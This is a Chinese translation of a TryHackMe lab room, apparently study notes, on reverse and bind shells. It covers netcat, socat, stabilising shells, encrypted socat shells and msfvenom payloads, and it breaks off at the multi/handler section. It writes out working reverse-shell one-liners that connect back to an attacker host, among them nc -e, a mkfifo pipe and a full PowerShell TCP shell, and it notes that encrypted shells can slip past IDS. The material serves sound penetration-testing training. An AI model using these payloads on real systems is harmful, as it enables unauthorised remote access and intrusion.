###### tags: `tryhackme`

[TOC]

# Privilege Escalation 权限提升

## 第 1 章 前言

这是 tryhackme 渗透测试章节的最后一个房间。原本想谷歌机翻然后我手工看一下，但是感觉这样练习不了英文，所以全部手工翻译，实在翻不出来再交给谷歌。手工翻译不免存在勘误，建议英文好的读者朋友们直接去阅览原文。

## 第 2 章 shell

权限提升，简称提权。在讲提权之前，先说说常见的 shell 以及它们的加固。

### 2.1 shell 是什么？

在我们深入了解发送和接收 shell 的复杂性之前，理解 shell 是什么很重要。

简单来说，shell 就是我们与命令行环境 (CLI) 交互时使用的工具。例如，Linux 中常见的 bash 或 sh 程序都是 shell 的示例。Windows 中的 cmd.exe 和 Powershell 也是如此。

有时我们可在目标机上进行 RCE，在这种情况下我们希望利用此漏洞来获取在目标机的 shell。

简单来说，我们可以强制远程机器向我们发送对其的命令行访问（reverse shell），或是我们主动连接到该机器上并获得该机器的 shell。

> reverse shell 就是反向/反弹 shell 的意思
> bind shell 就是正向 shell


### 2.2 工具篇

我们将使用多种工具来接收 reverse shell 和发送 bind shell。

通常我们需要恶意的 shell code 以及和生成的 shell 交互的方法。我们可通过以下几个工具实现这一点：


**1. Netcat：**

Netcat 号称网络的 “瑞士军刀” 。它用于执行各种网络交互，包括在枚举期间抓取 banner 等。

然而对于我们来说更重要的是它可以用于接收反弹 shell 或者连接到目标机上的 bind shell 的远程端口。

注：默认情况下，Netcat shell 非常不稳定（容易丢失），所以后文会介绍改进的技术。

**2. Socat：**

Socat 就像 steroids（英文原意是类固醇） 上的 netcat。它可以做所有相同的事情，甚至更多。 Socat shell 通常比 netcat shell 更稳定，从这个意义上说它远远优于 netcat。然而 socat 相比于 netcat 有以下两个问题： 
1. Socat 语法比 Netcat 难 
2. Socat 普及性不如 Netcat。默认情况下，几乎每个 Linux 发行版都安装了 Netcat。但它们默认情况下很少安装 Socat。 

这两个问题都有解决方法，我们将在后面介绍。

Socat 和 Netcat 都有用于 Windows 的 .exe 版本。

**3. Metasploit -- multi/handler:**

> 注意，以下有效载荷、有效负载等指的是 payload 的意思。

Metasploit 框架的 `auxiliary/multi/handler` 模块与 socat 和 netcat 一样，提供了用于接收反弹 shell 的功能。由于是 Metasploit 框架的一部分，所以 multi/handler 提供了一种成熟的方式来获取稳定的 shell，并提供了多种进一步的选项来改进捕获到的 shell。它也是与 meterpreter shell 交互的唯一方式，也是处理 staged payload （分阶段 payload？）的最简单方式。


**4. Msfvenom：**

与 multi/handler 一样，**msfvenom** 在技术上是 Metasploit 框架的一部分，但是，它作为独立工具提供。 Msfvenom 用于动态生成 payload 。虽然 msfvenom 可以生成除 reverse 和 bind shell 之外的 payload，但这不是本文的重点。

**Msfvenom 是一个非常强大的工具，因此我们将在专门的任务中更详细地介绍它。** 

除了我们已经介绍过的工具之外，还有许多不同语言的一些 shell 存储库。其中最突出的一个是 [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)。 此外，PentestMonkey [Reverse Shell Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) 也很常用。

除了这些在线资源，Kali Linux 还预装了位于 `/usr/share/webshells` 的各种 webshell。 [SecLists repo](https://github.com/danielmiessler/SecLists) 虽然主要用于单词列表，但也包含一些用于获取 shell 的非常有用的代码。

### 2.3 Shell 的类型

我们主要对两种 shell 感兴趣：Reverse shell 和 bind shell。

- **Reverse shell（反弹/向 shell）** 是指目标被迫连接到您的计算机。在您自己的计算机上，您可以使用上一个任务中提到的工具之一来设置用于接收连接的侦听器。

反向 shell 是绕过防火墙规则的好方法，因为防火墙规则可能会阻止您连接到目标上的任意端口。

反向 shell 的缺点是当通过 Internet 从一台机器接收 shell 时，您需要配置自己的网络以便接受它。（最经典的例子就是使用阿里的云服务器接收反弹的 shell 时要修改安全组规则）


- **bind shell（正向 shell）** 是指在目标上执行代码时，我们直接让其打开一个附加到 shell 上的监听器（即端口）。端口将会向互联网开放，这意味着您可以连接到代码打开的端口并以这种方式获得 RCE 的能力。这具有不需要在您自己的网络上进行任何配置的优点，但可能会被保护目标的防火墙阻止。 

一般情况下，反向 shell 更容易执行和调试。以下会给出反弹 shell 和 正向 shell 的示例，请注意它们间的区别。


**Reverse Shell 的例子：**

让我们从更常见的反向 shell 开始。以下图为例，在左侧我们有一个反向 shell 侦听器——这是接收连接的地方。右侧是发送反向 shell 的模拟（实际上，这更有可能通过远程网站上的代码注入或类似的方式来完成）把左边的图片想象成你自己的电脑，把右边的图片想象成目标。 

在攻击机器上：
`sudo nc -lvnp 443`

在目标机器上：
`nc <攻击机的ip> <攻击机的端口> -e /bin/bash`

![](https://i.imgur.com/L7xHtHv.png)

请注意，在运行右侧的命令后，侦听器会收到一个连接。当运行 `whoami` 命令时，我们看到我们正在以目标用户的身份执行命令。这里重要的是我们正在攻击机上监听，并收到了来自目标的连接。

> nc 的 -e 选项表示在连接成功后要执行的程序，这里表示连接成功之后把自己的 bash 发送到另一端


**bind shell 的例子：**

bind shell 不太常见，但仍然非常有用。 以下图为例，在左侧同样是攻击者的计算机，而右侧依然是我们的模拟目标。但是为了稍微调整一下，这次我们将使用 Windows 目标。
首先，我们在目标上启动一个侦听器——这次我们告诉它连接完毕后执行 cmd.exe。然后，在侦听器启动并运行的情况下，我们从自己的机器连接到新打开的端口。

在目标机上：
`nc -lvnp <port> -e "cmd.exe"`
    
在攻击机上：
`nc <目标机ip> <port>`

![](https://i.imgur.com/Twbii0P.png)

如您所见，这再次让我们在目标机上执行代码。请注意，这并非特定于 Windows。 这里要理解的重要一点是目标在监听特定端口，然后我们主动连接到目标的这个端口。

与此任务相关的最后一个概念是交互性。shell 可以是交互式的，也可以是非交互式的。 

- 交互式：如果您使用过 Powershell、Bash、Zsh、sh 或任何其他标准 CLI 环境，那么您将习惯于交互式 shell。交互式的 shell 允许您在执行程序后与程序进行交互。例如，采用 SSH 登录的提示：

![](https://i.imgur.com/G6sfzlQ.png)

在这里您可以看到它以交互方式询问用户键入 yes 或 no 以继续连接。这是一个交互式程序，需要交互式 shell 才能运行。

- 非交互式 shell 不会给你那种 “奢侈” 。在非交互式 shell 中，您只能使用不需要用户交互即可正常运行的程序。不幸的是，大多数简单的反向 shell 和正向 shell 都是非交互式的，这会使进一步的利用变得更加棘手。让我们看看当我们尝试在非交互式 shell 中运行 SSH 时会发生什么：

![](https://i.imgur.com/RLywVYp.png)

请注意，whoami 命令（非交互式）执行地很好，但 ssh 命令（交互式）根本没有给我们任何输出。

>注：交互式命令的输出确实会出现在某个地方，但是，弄清楚在哪里是您自己尝试的练习。可以说交互式程序在非交互式 shell 中不起作用。 此外， 上图的 listener 命令是用于演示的攻击机独有的别名，是 `sudo rlwrap nc -lvnp 443` 命令的简写方式，将在后续任务中介绍。除非已在本地配置别名，否则它将无法在任何其他计算机上运行。

**回答下列问题：**
1. 哪种类型的 shell 会回连到您计算机上的侦听端口，反向 \(R\) 或绑定 (B)？
2. 您已将恶意 shell 代码注入网站。您收到的 shell 可能是交互式的吗？ （是或否）
3. 使用 bind shell 时，您会在攻击者 (A) 还是目标 (T) 上执行侦听器？

### 2.4 Netcat

如前所述，Netcat 是渗透测试人员工具包中最基本的工具之一，涉及任何类型的网络。有了它，我们可以做各种各样有趣的事情，但现在让我们关注和 netcat 相关的 shell。

++Reverse Shells++

在前面的任务中，我们看到反弹 shell 需要 shellcode 和一个侦听器。执行 shell 的方法有很多种，因此我们将从查看侦听器开始。 

使用 Linux 启动 netcat 侦听器的语法如下：

`nc -lvnp <端口号> `
- `-l` 用于告诉 netcat 这将是一个监听器
- `-v` 用于请求详细输出 
- `-n` 告诉 netcat 不解析主机名及DNS，在此不过多阐述。 
- `-p` 表示要监听的端口。 

上一个任务中的示例使用 443 端口。实际上，您可以使用任何您喜欢的端口，只要还没有服务使用它即可。

>请注意，如果您选择使用小于 1024 的端口，则在启动侦听器时需要加上 `sudo`。

使用众所周知的端口号（80、443 或 53 是不错的选择）通常是个好主意，因为这更有可能通过目标上的出站防火墙规则。 比如以下命令在 443 端口上打开一个侦听器：

```bash
sudo nc -lvnp 443
```

然后，我们可以使用任意数量的 payload 连接到以上侦听器，具体取决于目标上的环境。

++Bind Shells++

如果我们希望在目标上获得 bind shell，那么我们可以假设已经有一个侦听器在目标的特定端口上等待我们，我们需要做的就是连接到它。其语法相对简单： 

```bash
nc <目标IP> <目标上的特定端口>
```
在这里，我们使用 netcat 在我们选择的端口上建立到目标的出站连接。

###  2.5 加固 Netcat shell

在得到一个 Netcat shell 之后，我们首先应该做什么？

答案是加固我们得到的 shell！

默认情况下，这些 shell 非常不稳定。例如按 `Ctrl + C` 会断开 shell。

此外它们还是非交互式的，并且经常有奇怪的格式错误。这是因为 netcat shell 实际上是在终端内运行的进程，而不是真正的终端本身。

幸运的是，有很多方法可以稳定 Linux 系统上的 netcat shell。下文我们将介绍三个加固 netcat shell 的方法。 

>注：Windows 反弹 shell 的加固往往很困难。好在我们下文介绍的第二种技术对此特别有用。

#### 技术 1：Python

我们要讨论的第一种技术仅适用于 Linux 机器，因为它们几乎总是默认安装 Python。该技术有三个操作步骤： 
1. 首先要做的是在目标机的 shell 上（无论是反向的还是正向的）执行如下命令
```bash
python -c 'import pty;pty.spawn("/bin/bash")
```
它使用 Python 生成功能更好的 bash shell。请注意，某些目标可能需要指定 Python 版本。如果是这种情况，请根据需要将 “python” 替换为 “python2” 或 “python3”。

命令执行完毕后我们的 shell 看起来会更漂亮一些，但我们仍然无法使用 tab 键进行自动补齐，并且 Ctrl + C 仍会终止 shell。 

2. 第二步是在**目标机**的 shell 上执行 `export TERM=xterm` 命令。这将使我们能够访问诸如 `clear` 之类的术语命令。 
3. 最后也是最重要的一步，使用 `Ctrl + Z` 挂起目标的 shell 回到**我们的终端**并输入以下命令：
```bash
stty raw -echo;fg 
```
以上命令做了两件事情：

1. 它关闭了我们的终端回显（这允许我们可以使用 `tab` 自动补齐以及在 shell 内部输入 `Ctrl + C` 终止进程）。
2. 回到目标机的 shell 上从而完成整个加固 shell 的过程。

下图是一个完整的示例：

![](https://i.imgur.com/7gFg6c7.png)

>注意到如果 shell 断开了，那么你的终端上的任意输入都将不可见（因为之前我们禁用了终端回显）。不过我们可以输入 `reset` 命令修复这一点。




#### 技术 2：rlwrap

`rlwrap` 是一个程序，简单来说，它能让我们在收到 shell 后就立即拥有访问历史记录、tab 键自动补齐等功能。但是，如果您希望能够在 shell 中使用 `Ctrl + C`，则还需进行一些操作。 

Kali 默认没有安装 rlwrap，所以首先使用 `sudo apt install rlwrap` 安装它。 

使用 rlwrap 开启一个侦听器的语法很简单，仅需要在 nc 命令的前面加上 **rlwrap** 即可。


```bash
rlwrap nc -lvnp <监听的端口>
```

在我们的 netcat 侦听器前面加上 **“rlwrap”** 可以为我们提供一个功能更齐全的 shell。

这种技术在处理 Windows shell 时特别有用。(众所周知 Windows shell 很不稳定)。在处理 Linux 目标时，可以使用上述讲到的技术来加固 shell：
1. 使用 Ctrl + Z 挂起 shell
2. 使用如下命令加固 shell 并重新进入。
```bash
stty raw -echo；fg
```
 



#### 技术 3：Socat 

第三种稳定 shell 的方法是以 Netcat shell 为基础，得到一个更加稳定的 Socat shell。

>**请记住，此技术仅限于 Linux 目标**。因为 Windows 上的 Socat shell 不会比 netcat shell 更稳定。


为了实现这种稳定方法，我们首先需要将一个 [静态的 socat 编译的二进制文件](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)（一个编译为没有依赖关系的程序版本）传输到目标机器。

**如何上传文件到目标机器？**

一般的方法是在存放 socat 二进制文件的目录下开启一个 web 服务器（在攻击机器上），然后让目标机访问该 web 服务器并下载 socat 文件即可。

如果安装了 python，可以使用以下命令开启一个 web 服务器：

```python
sudo python3 -m http.server 80
``` 
若是 python2 的话，则应输入以下命令：

```bash
sudo python -m SimpleHTTPServer
```


然后就可以在目标机器的 netcat shell 上下载文件了。


如果 Linux 系统，可以使用 `curl` 或 `wget` (`wget <LOCAL-IP>/socat -O /tmp/socat`) 来下载文件。 

如果是 Windows 系统，可以使用 Powershell 完成相同的操作。比如使用 `Invoke-WebRequest` 或 webrequest 系统类，具体取决于安装的 Powershell 版本（`Invoke-WebRequest -uri <LOCAL-IP>/socat .exe -outfile C:\\Windows\temp\socat.exe`）。 


#### 更改终端 tty 大小

使用上述任何技术来改变你的终端 tty 大小是一件很有用的事情。这是您的终端在使用常规 shell 时会自动执行的操作。然而，如果您想使用类似文本编辑器的东西来覆盖屏幕上的所有内容，则必须在反向或正向 shell 中手动更改终端 tty 大小。 


首先，在攻击机上打开终端运行 `stty -a` 命令，并记下输出中 `rows` 和 `columns` 的值： 

![](https://i.imgur.com/v2oeT3e.png)



接下来，在您的 reverse / bind shell 中，键入： `stty raws <number1> 和 stty cols <number2>` 命令
number1、number2 填写您在自己的终端中运行命令获得的数字（上图分别是 45 和 118）。 这将改变终端的注册宽度和高度，从而使得文本编辑器等依赖此类信息准确的程序正确打开。

**回答以下问题：**

1. 您将如何将终端大小更改为 238 列？
2. 在端口 80 上设置 Python3 网络服务器的语法是什么？

### 2.6 Socat

Socat 在某些方面与 netcat 相似，但在许多其他方面有根本的不同。考虑 socat 的最简单方法是将其作为两点之间的连接器。在这个房间内，这基本上是一个监听端口和键盘，但是，它也可以是一个监听端口和一个文件，或者实际上是两个监听端口。 socat 所做的只是提供两点之间的链接——很像 Portal 游戏中的 portal gun！ 

我们再次以反向 shell 为例：

#### 1. 反向 shell
如前所述，socat 的语法比 netcat 的语法难得多。

下面是 socat 中开启反向 shell 侦听器的语法：
```bash
socat TCP-L:<端口> -
```

与 netcat 一样，这需要两个点（监听的端口和标准输入）并将它们连接在一起。

生成的 shell 是不稳定的，但这将适用于 Linux 或 Windows，并且等效于 `nc -lvnp <port>`。 

在 Windows 上，我们将使用以下命令连接上述侦听器：

```bash
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes 
```    
 “pipes” 选项用于强制 powershell（或 cmd.exe）使用 Unix 风格的标准输入和输出。 
Linux 目标的等效命令如下：

```bash
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```
#### Bind Shells
在 Linux 目标上，我们将使用以下命令：
```bash
socat TCP-L:<PORT> EXEC:"bash -li"
```
    
在 Windows 目标上，我们将为我们的侦听器使用此命令：
```bash
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

我们使用 “pipes” 参数来连接 Unix 和 Windows 在 CLI 环境中处理输入和输出的方式。 
无论目标是什么，我们都在我们的攻击机器上使用这个命令来连接到等待的监听器。 
```bash
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

现在让我们来看看 Socat 的一个更强大的用途：一个完全稳定的 Linux tty 反向 shell。这仅在目标为 Linux 时有效，但要稳定得多。如前所述，socat 是一个非常通用的工具；然而，以下技术可能是其最有用的应用之一。这是新的侦听器语法： 

```bash
socat TCP-L:<port> FILE:`tty`,raw,echo=0 
```

让我们把这条命令分解成两部分。像往常一样，我们将两点连接在一起。在这种情况下，这些点是一个监听端口和一个文件。具体来说，我们将当前 TTY 作为文件传递，并将 echo 设置为零。这大约相当于使用 netcat shell 时使用的 Ctrl + Z, `stty raw -echo;fg` 技巧

第一个侦听器可以连接到任何有效负载；但是，这个特殊的侦听器必须使用非常具体的 socat 命令来激活。这意味着目标必须安装 socat。然而大多数机器默认情况下没有安装 socat，但我们可以上传[预编译的 socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) 二进制文件到目标上，然后就可以正常执行。
特殊命令如下： 

```bash
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

以上命令稍显复杂，所以让我们分解一下。 第一个部分很简单——我们要连接到我们自己机器上运行的侦听器。命令的第二部分使用 `EXEC:"bash -li"` 创建一个交互式 bash 会话。我们还传递参数：pty、stderr、sigint、setsid 和 sane： 
- pty 在目标上分配一个伪终端——稳定过程的一部分 
- stderr 确保任何错误消息都显示在 shell 中（通常是非交互式 shell 的问题） 
- sigint 将任何 Ctrl + C 命令传递到子进程中，允许我们在 shell 中终止命令 
- setsid 在新会话中创建进程 
- sane 稳定终端，试图 “正常化” 它。 


要接受的内容很多，所以让我们看看它的实际应用。 

与往常一样，在左侧我们有一个在本地攻击机器上运行的侦听器，在右侧我们有一个受感染目标的模拟，使用非交互式 shell 运行。

![](https://i.imgur.com/yXPuINO.png)

使用非交互式 netcat shell，我们执行特殊的 socat 命令，并在左侧的 socat 侦听器上接收到一个完全交互式的 bash shell：

请注意，socat shell 是完全交互式的，允许我们使用交互式命令，例如 SSH。然后可以通过设置 stty 值来进一步改进，如上一个任务中所示，这将让我们使用 Vim 或 Nano 等文本编辑器。 如果在任何时候 socat shell 无法正常工作，那么通过在命令中添加 `-d -d` 来增加详细程度是非常值得的。这对于实验目的非常有用，但对于一般用途通常不是必需的。

**回答以下问题：**
1. 我们如何让 socat 监听 TCP 端口 8080？

### 2.7 加密的 Socat Shells
socat 的众多优点之一是它能够创建加密的 shell —— 反向和正向 shell 都可加密。我们为什么要这样做？除非您拥有解密密钥，否则无法监视加密的 shell，因此通常能够绕过 IDS。

我们在上一个任务中介绍了如何创建基本的 shell，因此这里不再介绍语法。一句话足以说明如何使用加密shell：将原命令中的 `TCP` 部分换成 `OPENSSL` 即可。我们将在任务结束时介绍几个示例，但首先让我们谈谈证书。

我们首先需要生成证书才能使用加密的 shell。这在我们的攻击机器上最容易做到：
```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt 
```
此命令创建一个 2048 位 RSA 密钥和匹配的证书文件，自签名，有效期不到一年。当您运行此命令时，它会要求您填写有关证书的信息。这可以留空，或随机填充。 然后我们需要将两个创建的文件合并到一个 `.pem` 文件中： 

`cat shell.key shell.crt > shell.pem`

现在，当我们设置我们的反向 shell 侦听器时，我们使用： 

```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 
```
    
这将使用我们生成的证书设置一个 OPENSSL 侦听器。 `verify=0` 告诉连接不要费心尝试验证我们的证书是否已由公认的权威机构正确签名。请注意，必须在正在侦听的任何设备上使用该证书。

要返回连接，我们将使用： 
```bash
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

相同的技术适用于 bind shell： 
目标：
```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes 
```

攻击者： 
```bash
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0
```
- 再次注意，即使对于 Windows 目标，证书也必须与侦听器一起使用，因此需要为 bind shell 复制 PEM 文件。 下图显示了来自 Linux 目标的 OPENSSL 反向 shell。和往常一样，目标在右边，攻击者在左边：

![](https://i.imgur.com/uqG9bL8.png)

这种技术也适用于上一个任务中介绍的特殊的、仅限 Linux 的 TTY shell —— 弄清楚它的语法将是这个任务的挑战。如果您正在努力获得答案，请随意使用 Linux 练习盒（可部署在房间的尽头）进行实验。

**回答以下问题：**
1. 使用上一个任务中的 tty 技术设置 OPENSSL-LISTENER 的语法是什么？使用端口 53 和一个名为“encrypt.pem”的 PEM 文件

```bash
socat OPENSSL-LISTEN:<53>,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0 
```
2. 如果您的 IP 是 10.10.10.5，您将使用什么语法连接回此侦听器？

```bash
socat OPENSSL:10.10.10.5:53 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

### 2.8 常用的 Shell Payloads
> 有效负载表示 payload 的意思


我们很快就会考虑使用 `msfvenom` 生成有效负载，但在此之前，让我们使用我们已经介绍过的工具看一下一些常见的有效负载。 

之前的任务提到我们将研究使用 netcat 作为 bind shell 侦听器的一些方法，因此我们将从它开始。在某些版本的 netcat 中（包括 Kali 位于 `/usr/share/windows-resources/binaries` 处的 nc.exe Windows 版本，以及 Kali 自身所用的版本：`netcat-traditional`）有一个 `-e` 选项，它允许您在连接上执行一个程序。例如一个监听器：
`nc -lvnp <端口> -e /bin/bash` 

使用 netcat 连接到上述侦听器将在目标上生成一个 bind shell。 同样，对于反向 shell，使用 `nc <LOCAL-IP> <PORT> -e /bin/bash` 回连将导致目标上的反向 shell。

然而，这并没有包含在大多数版本的 netcat 中，因为它被广泛认为是非常不安全的（这很有趣，是吧？）。在几乎总是需要静态二进制文件的 Windows 上，此技术将非常有效。然而，在 Linux 上，我们将改为用此代码创建一个 bind shell 侦听器： 
```bash
mkfifo /tmp/f; nc -lvnp <端口> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm/tmp/f 

```
以下段落是对该命令的技术解释。它略高于这个房间的高度，所以如果你现在看不懂也没关系——命令本身才是最重要的。 该命令首先在 `/tmp/f ` 中创建[命名管道](https://www.linuxjournal.com/article/2156)。然后它启动一个 netcat 侦听器，并将侦听器的输入连接到命名管道的输出。 netcat 侦听器的输出（即我们发送的命令）然后直接通过管道传输到 `sh`，将 stderr 输出流发送到 stdout，并将 stdout 本身发送到命名管道的输入，从而完成循环。 

![](https://i.imgur.com/2vy6cXk.png)


可以使用一个非常相似的命令来发送 netcat 反向 shell： 
```bash
mkfifo /tmp/f; nc <本地IP> <端口> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm/tmp/f 
```
除了使用 netcat connect 语法而不是 netcat listen 语法之外，此命令实际上与前一个命令相同。
    
![](https://i.imgur.com/QDLQ1Fa.png)

以现代 Windows Server 为目标时，通常需要 Powershell 反向 shell，因此我们将在此处介绍标准的单行 PSH 反向 shell。 这个命令比较复杂，这里为了简单起见就不直接说明了。然而，它是一种非常有用的单行线，可以随身携带：

```bash
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```




为了使用它，我们需要用适当的 IP 和端口选择替换“\<IP\>”和“\<port\>”。然后可以将其复制到 cmd.exe shell（或在 Windows 服务器上执行命令的另一种方法，例如 webshell）并执行，从而产生反向 shell：
    
![](https://i.imgur.com/yXXTr0O.png)
    
对于其他常见的反向 shell payload，[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) 是一个存储库，其中包含多种不同语言的 shell 代码（通常是用于复制和粘贴的单行格式）。阅读链接页面以查看可用内容非常值得。
    
**回答以下问题：**
1. 在 Linux 中可以使用什么命令来创建命名管道？
    
2. 查看链接的 Payloads all Things Reverse Shell Cheatsheet 并熟悉可用的语言。

### 2.9 msfvenom

Msfvenom：所有和 payload 相关事物的一站式商店

作为 Metasploit 框架的一部分，msfvenom 主要用于生成反向 shell 和正向 shell。同时 msfvenom 也广泛用于低水平的 exploit 开发，比如在开发一些用于缓冲区溢出的 expolit 时生成十六进制 shellcode。 然而，msfvenom 也可以用于 生成多种格式的 payloads，比如 .exe、.apsx、.war、.py 等。

以下简单地介绍一下 msfvenom：

msfvenom 的标准语法如下：
`msfvenom -p <PAYLOAD> <OPTIONS>`

例如，为了生成一个 exe 格式的 Windows x64 反向 shell，我们可以使用：
`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`

![](https://i.imgur.com/vuzJ3gf.png)

上述命令的四个选项含义如下：
- -f <格式>
指定输出格式，在案例中是 exe
- -o <文件> 
生成的 payload 的路径和文件名

- LHOST=<IP>
指定要回连的 IP
    
- LPORT=<port>
要回连的本地机器的端口，可以是 0 到 65535 间的未使用的任意值。然而，使用小于 1024 的端口时要 root 权限
    
++Staged vs Stageless++

现在介绍两个新概念， staged 反向 shell payloads 和 stageless 反向 shell payloads。
- Staged（分期的） paylodas 分为两部分发送。第一部分称为 stager。这是直接在服务器上执行的代码块，其会回连到一个处于等待状态的监听器，但它本身实际上不包含任意的反向 shell code。那 shell code在哪里呢？
当 stager 连接到监听器时，其会使用连接来加载真正的 payload 并直接执行它，同时会预防 payload 接触硬盘，因为传统的反病毒解决方案可能会捕捉到硬盘里的 payload。
    所以 payload 被分为两个部分：一个小的、初始的 stager 以及 stager 被激活时下载的更庞大的反向 shell。 Staged paylodas 要求一个特别的监听器，通常是 Metasploit multi/handler。
    
- Stageless payloads 更加常见。Stageless payloads 是完全自包含的。Stagsless payloads 存在一个代码块，当我们执行它时，其会马上发回一个 shell 给等待中的监听器。
    
Stagsless payloads通常更易于使用和捕获。然而，它们也更加庞大并且更容易被反病毒或入侵检测程序发现和移除。Staged paylodas 更难以使用，但是 初始的 stager 更加短小，所以有时不会被低效的反病毒软件察觉。现代防病毒解决方案还将利用反恶意软件扫描接口 (AMSI) 来检测由 stager 加载到内存中的 payloads，从而使分阶段的 payloads 在该区域的效率不如以前。

++Meterpreter++
在 Metasploit 主题中要谈论的另一个重要的事物就是 Meterpreter shell。Meterpreter shell 是 Metasploit 特有的全功能 shell。Meterpreter shell 完全稳定，这在渗透 windows 目标时非常有用。此外，Meterpreter shell 有许多内置的功能，比如文件上传和下载。如果我们想要使用 Metasploit post-exploitation 模块下的任意工具，那么我们就需要使用一个 meterpreter shell。meterpreter shell 的缺点是它们必须被 Metasploit 捕获。
    
++Payload Naming Conventions++
    
当使用 msfvenom时，理解命名系统是如何工作的十分重要。msfvenom 的基本命名约定如下：
`<操作系统><体系结构>/<payload>`
    
举个例子：
```bash
linux/86/shell/reverse_tcp
```
以上命令会生成一个用于 linux x86 目标的 stageless 反向 shell。
但是以上命名约定对于 Windows32 操作系统的目标不太适用，对于这类目标，通常不指定体系结构。比如：
```bash
windows/shell_reverse_tcp
```
对于 64 比特的 Windows 目标，通常指定体系结构为 x64。
    
以上的例子中所用的 payload 是 `shell_reverse_tcp`，这表明其是一个 stageless payload。为什么呢？因为 Stageless payloads 用 下划线表示。这个 payload 的 staged 版本是 `shell/reverse_tcp`，因为 staged payloads 用斜线来表示。

一个 32 位的 linux stageless Meterpreter payload 如下所示：
    
```bash
linux/x86/meterpreter_reverse_tcp
```

当我们在使用 msfvenom 时，要注意到的另一件重要的事情是：
    
```bash
msfvenom --list payloads
```
该命令可用于列出所有可用 payloads，我们可在该命令后拼接上管道符以及 `grep` 命令来查找特定 payloads 集合。举个例子：

![](https://i.imgur.com/D6TjHG3.png)


以上命令会给出 32 位 linux 目标的 neterpreter paylodas 的完整集合。
    
**回答以下问题：**
1. 生成一个用于 64 位 Windows 目标的 staged 反向 shell（.exe 格式）
2. 哪个符号被用来表明一个 shell 是 stageless 的？
    
3. 使用什么命令生成一个用于 64 位的 Linux 目标的 staged meterpreter 反向 shell？假定你的 ip 是 10.10.10.5，监听的端口是 443，shell 的格式是 `elf`，输出的文件名是 `shell`
    
 
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp -LHOST=10.10.10.5 -LPORT=443 -f elf -o shell
```

### 2.10 Metasploit multi/handler

Multi
    
    